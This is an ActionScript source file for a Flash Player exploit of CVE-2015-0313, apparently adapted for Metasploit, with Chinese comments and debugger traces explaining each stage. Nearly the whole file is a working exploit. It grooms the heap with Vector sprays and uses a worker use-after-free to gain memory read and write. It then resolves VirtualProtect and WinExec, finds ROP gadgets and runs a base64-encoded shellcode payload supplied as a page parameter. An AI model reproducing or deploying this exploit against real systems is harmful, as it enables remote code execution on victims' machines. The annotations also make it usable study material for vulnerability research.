// Build how to:
// 1. Download the AIRSDK, and use its compiler.
// 2. Be support to support 16.0 as target-player (flex-config.xml).
// 3. Download the Flex SDK (4.6)
// 4. Copy the Flex SDK libs (<FLEX_SDK>/framework/libs) to the AIRSDK folder (<AIR_SDK>/framework/libs)
//      (all of them, also, subfolders, specially mx, necessary for the Base64Decoder)
// 5. Build with: mxmlc -o msf.swf Main.as

// Original code by @hdarwin89 // http://hacklab.kr/flash-cve-2015-0313-%EB%B6%84%EC%84%9D/
// Modified to be used from msf
package
{
	import flash.display.Sprite
	import flash.display.LoaderInfo
	import flash.events.Event
	import flash.utils.ByteArray
	import flash.system.Worker
	import flash.system.WorkerDomain
	import flash.system.MessageChannel
	import flash.system.ApplicationDomain
	import avm2.intrinsics.memory.casi32
	import mx.utils.Base64Decoder
	
	public class Main extends Sprite
	{
		private var ov:Vector.<Object> = new Vector.<Object>(25600)
		private var ba:ByteArray = new ByteArray()
		private var worker:Worker
		private var mc:MessageChannel
		private var b64:Base64Decoder = new Base64Decoder()
		private var payload:String = ""
		
		public function Main()
		{
			if (Worker.current.isPrimordial) mainThread()
			else workerThread()
		}
		
		private function mainThread():void
		{
			var b64_payload:String = LoaderInfo(this.root.loaderInfo).parameters.sh
			var pattern:RegExp = / /g;
			b64_payload = b64_payload.replace(pattern, "+")
			b64.decode(b64_payload)
			payload = b64.toByteArray().toString()
			
			ba.length = 0x1000
			ba.shareable = true
			
			// 喷射vector.<object>到堆上，然后间隔释放产生内存空洞3
			for (var i:uint = 0; i < ov.length; i++) {
				ov[i] = new Vector.<Object>(1014)   // 1014=0x3f6
				ov[i][0] = ba
				ov[i][1] = this
			}

			for (i = 0; i < ov.length; i += 2) delete(ov[i])
			
			worker = WorkerDomain.current.createWorker(this.loaderInfo.bytes)
			mc = worker.createMessageChannel(Worker.current)
			mc.addEventListener(Event.CHANNEL_MESSAGE, onMessage)
			worker.setSharedProperty("mc", mc)
			worker.setSharedProperty("ba", ba)
			ApplicationDomain.currentDomain.domainMemory = ba   // 设置ba为全局内存可访问
			worker.start()
		}
		
		private function workerThread():void
		{
			var ba:ByteArray = Worker.current.getSharedProperty("ba")
			var mc:MessageChannel = Worker.current.getSharedProperty("mc")
			ba.clear()  // 清除ba，但domainMemory依然保留着对ba.buffer的引用
			
			ov[0] = new Vector.<uint>(1022) // 1022（0x3FE）*4+8=0x1000，与ba同大小
			for (var i:uint = 0; i < ov[0].length; i++) {
				ov[0][i] = 0x55667788
			}
			//=====================================================
			//	0:013> g
			//	‘==== ByteArray Buffer ====’
			//	06e274c0  0747c000 00001000 00001000 00000000
			//	……
			//	0:034> dd 0747c000 l1
			//	0747c000  000003fe 	// 已经被设置成vector.<uint>长度值
			//=====================================================
			
			mc.send("")
			//=====================================================
			//  0:013> ba w4 0747c000 // 下访问断点，观察其值的变化
			//  0:013> dd 0747c000 l1
			//	0747c000  ffffffff  // 已经在OnMessage函数中修改长度为0xFFFFFFFF
			//=====================================================
			
			while (mc.messageAvailable);
			
			// 下一个vector+(0x403-0x3FE)*4 -0x18 = 下一个vector起始地址，
			// 再减去0x1000（Vector对象大小），刚好就是ov[0][0]自身的内存地址
			ov[0][0] = ov[0][0x403] - 0x18 - 0x1000
			//=====================================================
			// 	0:026> dd (0747c000+0x403*4) l4
			//	0747d00c  06e27068 0747b000 0747d018 00000010 	//  取数组值，去掉头8字节头信息，因此ov[0][0x403]=0x0747d018
			//	0:026> ? 0747d018-0x18-0x1000
			//	Evaluate expression: 122142720 = 0747c000	
			// 	0:026> dd 0747c000 l4
			//	0747c000  ffffffff 0dc55000 0747c000 00000000	// 获取的是它自身的地址0x0747c000
			//=====================================================
			
			ba.length = 0x500000
			//=====================================================
			//	0:026> g
			//	‘==== globalMemory ====’
			//	0dfdeec4  609eaa7f 0e310000 00500000 06eef810  // 设置新长度，导致在domainMemory重新分配内存
			//	……
			//=====================================================
			
			// 获取后面用于写入rop+shellcode的buffer地址，其实就是设置长度0x500000之后的ByteArray对应的buffer
			var buffer:uint = vector_read(vector_read(ov[0][0x408] - 1 + 0x40) + 8) + 0x100000  
			//=====================================================
			// 	0:013> dd 0747c000+0x408*4 l4
			// 	0747d020  61008e04 000003f6 06ee1c91 0755f041
			//	下面减1是由于atom类型的后3 bit代表对象指针数据类型信息，所以真实值应该为addr&0xfffffff8，此处就相当于减1
			//	0:026> ? 06ee1c91-1+0x40	
			//	Evaluate expression: 116268240 = 06ee1cd0
			//	因此 buffer 	= vector_read(vector_read(06ee1cd0) +8)+0x100000 ＝ 0x0e410000  
			//	
			//=====================================================
			
			var main:uint = ov[0][0x409] - 1
			//=====================================================
			//  ov[0][0x409]=ov[1][0x13]= vector+0x13*4 = vector+0x4c = vtable
			//	0:026> dd poi(0747c000+0x409*4+8)-1 l1
			//	0755f040  60f8cc38
			//=====================================================
			
			var vtable:uint = vector_read(main)
			//=====================================================
			// 	0:026> ln 60f8cc38
			//	(60b915e0)   Flash32_16_0_0_296!AdobeCPGetAPI+0x3fb658   |  (60b915e0)   Flash32_16_0_0_296!AdobeCPGetAPI
			// 	获取flash模块中的虚表地址，后面是通过调用base(vtable)搜索PE头获取到flash模块基址
			//=====================================================
			
			vector_write(vector_read(ov[0][0x408] - 1 + 0x40) + 8)  // buffer内存清零
			vector_write(vector_read(ov[0][0x408] - 1 + 0x40) + 16, 0xffffffff) // 写入buffer的长度为0xFFFFFFFF
			mc.send(ov[0][0].toString() + "/" + buffer.toString() + "/" + main.toString() + "/" + vtable.toString())
		}
		
		private function onMessage(e:Event):void
		{
			casi32(0, 1022, 0xFFFFFFFF) // ba长度被修改为0xFFFFFFF
			if (ba.length != 0xffffffff) mc.receive()
			else {
				ba.endian = "littleEndian"
				var data:Array = (mc.receive() as String).split("/")
				byte_write(parseInt(data[0]))
				var buffer:uint = parseInt(data[1]) as uint
				var main:uint = parseInt(data[2]) as uint
				var vtable:uint = parseInt(data[3]) as uint
				var flash:uint = base(vtable)
				var ieshims:uint = module("winmm.dll", flash)
				var kernel32:uint = module("kernel32.dll", ieshims)
				
				var virtualprotect:uint = procedure("VirtualProtect", kernel32)
				var winexec:uint = procedure("WinExec", kernel32)
				var xchgeaxespret:uint = gadget("c394", 0x0000ffff, flash)
				var xchgeaxesiret:uint = gadget("c396", 0x0000ffff, flash)
				
				//Continuation of execution
				byte_write(buffer + 0x30000, "\xb8", false); byte_write(0, vtable, false) // mov eax, vtable
				byte_write(0, "\xbb", false); byte_write(0, main, false) // mov ebx, main
				byte_write(0, "\x89\x03", false) // mov [ebx], eax
				byte_write(0, "\x87\xf4\xc3", false) // xchg esp, esi # ret
				
				byte_write(buffer+0x200, payload);  // 将base64解码后的shellcode指令写入
				byte_write(buffer + 0x20070, xchgeaxespret) // 调用虚函数 call dword ptr [eax+70h]，此时eax指向一下条指令，返回后刚好执行下面一条指令
				byte_write(buffer + 0x20000, xchgeaxesiret) 	// 伪造的虚表指针，确保程序的稳定性，返回后执行到下方的VirtualProtect函数
				byte_write(0, virtualprotect) 
				
				// VirtualProtect(rop,0x1000,PAGE_EXECUTE_READWRITE,rop+0x100)
				byte_write(0, winexec)
				byte_write(0, buffer + 0x30000)
				byte_write(0, 0x1000)
				byte_write(0, 0x40)
				byte_write(0, buffer + 0x100)
				
				// WinExec(payload,0)
				byte_write(0, buffer + 0x30000)
				byte_write(0, buffer + 0x200)
				byte_write(0)
				
				byte_write(main, buffer + 0x20000)  // 用伪造的虚表指针去覆写
				toString()  // 触发伪造的虚表指针被引用
			}
		}
		
		private function vector_write(addr:uint, value:uint = 0):void
		{
			addr > ov[0][0] ? ov[0][(addr - ov[0][0]) / 4 - 2] = value : ov[0][0xffffffff - (ov[0][0] - addr) / 4 - 1] = value
		}
		
		private function vector_read(addr:uint):uint
		{
			return addr > ov[0][0] ? ov[0][(addr - ov[0][0]) / 4 - 2] : ov[0][0xffffffff - (ov[0][0] - addr) / 4 - 1]
		}
		
		// 将地址addr作为ba读写的起始地址ba.position，然后借助bytearray来向特定地址写入特定值
		private function byte_write(addr:uint, value:* = 0, zero:Boolean = true):void
		{
			if (addr) ba.position = addr
			if (value is String) {
				for (var i:uint; i < value.length; i++) ba.writeByte(value.charCodeAt(i))
				if (zero) ba.writeByte(0)
			} else ba.writeUnsignedInt(value)
		}
		
		// 将地址addr作为ba读写的起始地址ba.position，然后借助bytearray来读取特定地址的数值
		private function byte_read(addr:uint, type:String = "dword"):uint
		{
			ba.position = addr
			switch(type) {
				case "dword":
					return ba.readUnsignedInt()
				case "word":
					return ba.readUnsignedShort()
				case "byte":
					return ba.readUnsignedByte()
			}
			return 0
		}
		
		private function base(addr:uint):uint
		{
			// 取虚表地址 高位word值+低位word清零 作为搜索的起始地址，找到MZ标记头即为flash模块基址
			addr &= 0xffff0000
			while (true) {
				if (byte_read(addr) == 0x00905a4d) return addr 
				addr -= 0x10000
			}
			return 0
		}
		
		private function module(name:String, addr:uint):uint
		{
			// 从模块基址addr偏移获取到导入表IAT基址
			var iat:uint = addr + byte_read(addr + byte_read(addr + 0x3c) + 0x80), i:int = -1
			while (true) {
				var entry:uint = byte_read(iat + (++i) * 0x14 + 12) // 获取可执行模块名称
				if (!entry) throw new Error("FAIL!");
				ba.position = addr + entry
				// 比较模块名称
				if (ba.readUTFBytes(name.length).toUpperCase() == name.toUpperCase()) break
			}
			return base(byte_read(addr + byte_read(iat + i * 0x14 + 16)))   // 获取name模块基址
		}
		
		// 获取特定模块中的API函数地址
		private function procedure(name:String, addr:uint):uint
		{
			// 通过模块基址获取导出表EAT地址
			var eat:uint = addr + byte_read(addr + byte_read(addr + 0x3c) + 0x78)
			var numberOfNames:uint = byte_read(eat + 0x18)  // 函数个数
			var addressOfFunctions:uint = addr + byte_read(eat + 0x1c)  // 函数地址表
			var addressOfNames:uint = addr + byte_read(eat + 0x20)  // 函数名地址表
			var addressOfNameOrdinals:uint = addr + byte_read(eat + 0x24)   // 函数名序号表
			for (var i:uint = 0; ; i++) {
				var entry:uint = byte_read(addressOfNames + i * 4)
				ba.position = addr + entry
				if (ba.readUTFBytes(name.length+2).toUpperCase() == name.toUpperCase()) break
			}
			// 获取相应API函数名的地址
			return addr + byte_read(addressOfFunctions + byte_read(addressOfNameOrdinals + i * 2, "word") * 4)
		}
		
		// 动态搜索特定模块地址addr中的gadget机器码，用于构造ROP指令序列
		private function gadget(gadget:String, hint:uint, addr:uint):uint
		{
			var find:uint = 0
			var limit:uint = byte_read(addr + byte_read(addr + 0x3c) + 0x50)
			var value:uint = parseInt(gadget, 16)
			for (var i:uint = 0; i < limit - 4; i++) if (value == (byte_read(addr + i) & hint)) break
			return addr + i
		}
	}
}